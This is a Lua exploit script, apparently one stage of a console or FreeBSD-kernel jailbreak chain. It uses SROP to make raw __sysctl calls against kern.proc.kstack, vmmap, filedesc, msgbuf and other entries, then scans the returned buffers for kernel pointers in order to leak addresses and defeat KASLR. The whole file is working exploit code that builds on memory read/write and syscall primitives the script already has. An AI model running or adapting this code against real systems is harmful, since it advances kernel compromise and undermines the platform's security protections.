-- CRASH_CLASS: MODERATE
-- PROBE 130c: SROP sysctl deep scan for kernel pointers
--
-- With SROP arbitrary syscall, try sysctl MIBs that might leak kernel
-- addresses. Key targets:
--   kern.proc.kstack (36) — kernel stack trace with kernel addresses
--   kern.proc.vmmap (35) — process VM map
--   kern.proc.filedesc (33) — file descriptor table
--   kern.proc.pathname (12) — binary path
--   kern.proc.osrel (40) — OS release
--   kern.proc.nfds (43) — fd count
--
-- IMPORTANT: arg4 (oldlenp) goes in R10, not RCX (syscall clobbers RCX)

print("=== PROBE 130c: SROP SYSCTL KPTR SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc20 = make_syscall(20)
local sc_getcontext = make_syscall(421)
local sc_sigreturn = make_syscall(417)
local pid = to_num(sc20())
print("[0] pid=" .. pid)

local MC = 0x40
local RAX = MC + 0x38
local RDI = MC + 0x08
local RSI = MC + 0x10
local RDX = MC + 0x18
local R8  = MC + 0x28
local R9  = MC + 0x30
local R10 = MC + 0x50
local RIP = MC + 0xA0
local CTX_SIZE = 0x500

local function srop_sysctl(mib_buf, mib_cnt, out_buf, lenp_buf)
    local ctx = memory.alloc(CTX_SIZE)
    zero(ctx, CTX_SIZE)
    pcall(function() return sc_getcontext(uint64(ctx)) end)
    local rip_val = rq(ctx + RIP)
    local rh, rl = get_hi_lo(rip_val)
    wq(ctx + RIP, uint64(string.format("0x%X%08X", rh, rl - 2)))
    wq(ctx + RAX, uint64(202))      -- __sysctl
    wq(ctx + RDI, uint64(mib_buf))  -- name
    wq(ctx + RSI, uint64(mib_cnt))  -- namelen
    wq(ctx + RDX, uint64(out_buf))  -- old
    wq(ctx + R10, uint64(lenp_buf)) -- oldlenp (R10, NOT RCX!)
    wq(ctx + R8, uint64(0))         -- new
    wq(ctx + R9, uint64(0))         -- newlen
    local ok, rv = pcall(function() return sc_sigreturn(uint64(ctx)) end)
    return rv, ok
end

local sc_mmap = make_syscall(477)
local ok_mm, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(64 * 0x4000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("[0] gpu=" .. hex(gpu))

local function scan_for_kptr(buf, len, label)
    local found = false
    for off = 0, len - 4, 8 do
        local v = rq(buf + off)
        if v then
            local h, l = get_hi_lo(v)
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                print(string.format("  [%s] +0x%03X: %s *** KERNEL POINTER! ***", label, off, hex(v)))
                found = true
            end
        end
    end
    return found
end

--------------------------------------------------------------------
-- 1. kern.proc.kstack (1.14.36.pid) — kernel stack trace!
--------------------------------------------------------------------
print("")
print("--- [1] kern.proc.kstack ---")

local mib1 = gpu + 0x00
zero(mib1, 24)
wd(mib1, 1)       -- CTL_KERN
wd(mib1+4, 14)    -- KERN_PROC
wd(mib1+8, 36)    -- KERN_PROC_KSTACK
wd(mib1+12, pid)

local out1 = gpu + 0x100
zero(out1, 0x2000)
local len1 = gpu + 0x20
wq(len1, uint64(0x2000))

local rv1 = srop_sysctl(mib1, 4, out1, len1)
print("  rv=" .. hex(rv1))
local retlen1 = rq(len1)
print("  retlen=" .. hex(retlen1))
local rl1 = to_num(retlen1)
if rl1 > 0 and rl1 < 0x2000 then
    print("  " .. rl1 .. " bytes returned!")
    scan_for_kptr(out1, rl1, "kstack")
end
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 2. kern.proc.vmmap (1.14.35.pid)
--------------------------------------------------------------------
print("")
print("--- [2] kern.proc.vmmap ---")

local mib2 = gpu + 0x2200
zero(mib2, 24)
wd(mib2, 1)
wd(mib2+4, 14)
wd(mib2+8, 35)    -- KERN_PROC_VMMAP
wd(mib2+12, pid)

local out2 = gpu + 0x2300
zero(out2, 0x8000)
local len2 = gpu + 0x2210
wq(len2, uint64(0x8000))

local rv2 = srop_sysctl(mib2, 4, out2, len2)
print("  rv=" .. hex(rv2))
local retlen2 = rq(len2)
print("  retlen=" .. hex(retlen2))
local rl2 = to_num(retlen2)
if rl2 > 0 then
    print("  " .. rl2 .. " bytes returned!")
    scan_for_kptr(out2, math.min(rl2, 0x400), "vmmap")
end
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 3. kern.proc.filedesc (1.14.33.pid)
--------------------------------------------------------------------
print("")
print("--- [3] kern.proc.filedesc ---")

local mib3 = gpu + 0xA400
zero(mib3, 24)
wd(mib3, 1)
wd(mib3+4, 14)
wd(mib3+8, 33)    -- KERN_PROC_FILEDESC
wd(mib3+12, pid)

local out3 = gpu + 0xA500
zero(out3, 0x4000)
local len3 = gpu + 0xA410
wq(len3, uint64(0x4000))

local rv3 = srop_sysctl(mib3, 4, out3, len3)
print("  rv=" .. hex(rv3))
local retlen3 = rq(len3)
print("  retlen=" .. hex(retlen3))
local rl3 = to_num(retlen3)
if rl3 > 0 then
    print("  " .. rl3 .. " bytes returned!")
    scan_for_kptr(out3, math.min(rl3, 0x200), "filedesc")
end
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 4. kern.proc.pathname (1.14.12.-1)
--------------------------------------------------------------------
print("")
print("--- [4] kern.proc.pathname ---")

local mib4 = gpu + 0xE600
zero(mib4, 24)
wd(mib4, 1)
wd(mib4+4, 14)
wd(mib4+8, 12)    -- KERN_PROC_PATHNAME
wd(mib4+12, -1)   -- current process

local out4 = gpu + 0xE700
zero(out4, 0x400)
local len4 = gpu + 0xE610
wq(len4, uint64(0x400))

local rv4 = srop_sysctl(mib4, 4, out4, len4)
print("  rv=" .. hex(rv4))
local path = ""
for i = 0, 0xFF do
    local b = rd(out4 + i)
    if b == nil or b == 0 then break end
    if b >= 32 and b < 127 then path = path .. string.char(b) end
end
if #path > 0 then print("  pathname=" .. path) end
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 5. kern.proc.osrel (1.14.40.pid)
--------------------------------------------------------------------
print("")
print("--- [5] kern.proc.osrel ---")

local mib5 = gpu + 0xEB00
zero(mib5, 24)
wd(mib5, 1)
wd(mib5+4, 14)
wd(mib5+8, 40)    -- KERN_PROC_OSREL
wd(mib5+12, pid)

local out5 = gpu + 0xEC00
zero(out5, 16)
local len5 = gpu + 0xEB10
wq(len5, uint64(16))

local rv5 = srop_sysctl(mib5, 4, out5, len5)
print("  rv=" .. hex(rv5) .. " value=" .. tostring(rd(out5)))
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 6. kern.msgbuf (1.28)
--------------------------------------------------------------------
print("")
print("--- [6] kern.msgbuf ---")

local mib6 = gpu + 0xED00
zero(mib6, 12)
wd(mib6, 1)       -- CTL_KERN
wd(mib6+4, 28)    -- KERN_MSGBUF

local out6 = gpu + 0xEE00
zero(out6, 0x1000)
local len6 = gpu + 0xED10
wq(len6, uint64(0x1000))

local rv6 = srop_sysctl(mib6, 2, out6, len6)
print("  rv=" .. hex(rv6))
local rl6 = to_num(rq(len6))
print("  retlen=" .. rl6)
if rl6 > 0 then
    local msg = ""
    for i = 0, math.min(rl6 - 1, 0x100) do
        local b = rd(out6 + i)
        if b == nil then break end
        if b >= 32 and b < 127 then msg = msg .. string.char(b)
        elseif b == 10 then msg = msg .. "\n" end
    end
    if #msg > 0 then print("  msgbuf: " .. msg:sub(1, 200)) end
    scan_for_kptr(out6, math.min(rl6, 0x200), "msgbuf")
end
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 7. security.jail.* (6.x)
--------------------------------------------------------------------
print("")
print("--- [7] kern.proc.groups (1.14.37.pid) ---")

local mib7 = gpu + 0xFF00
zero(mib7, 24)
wd(mib7, 1)
wd(mib7+4, 14)
wd(mib7+8, 37)    -- KERN_PROC_GROUPS
wd(mib7+12, pid)

local out7 = gpu + 0xFF80
zero(out7, 0x80)
local len7 = gpu + 0xFF10
wq(len7, uint64(0x80))

local rv7 = srop_sysctl(mib7, 4, out7, len7)
print("  rv=" .. hex(rv7) .. " retlen=" .. hex(rq(len7)))
local rl7 = to_num(rq(len7))
if rl7 > 0 then
    print("  groups:")
    for i = 0, math.min(rl7/4, 8) - 1 do
        local g = rd(out7 + i*4)
        if g then print("    gid=" .. g) end
    end
end
print("[alive] pid=" .. to_num(sc20()))

print("")
print("[FINAL] pid=" .. to_num(sc20()))
print("=== PROBE 130c COMPLETE ===")
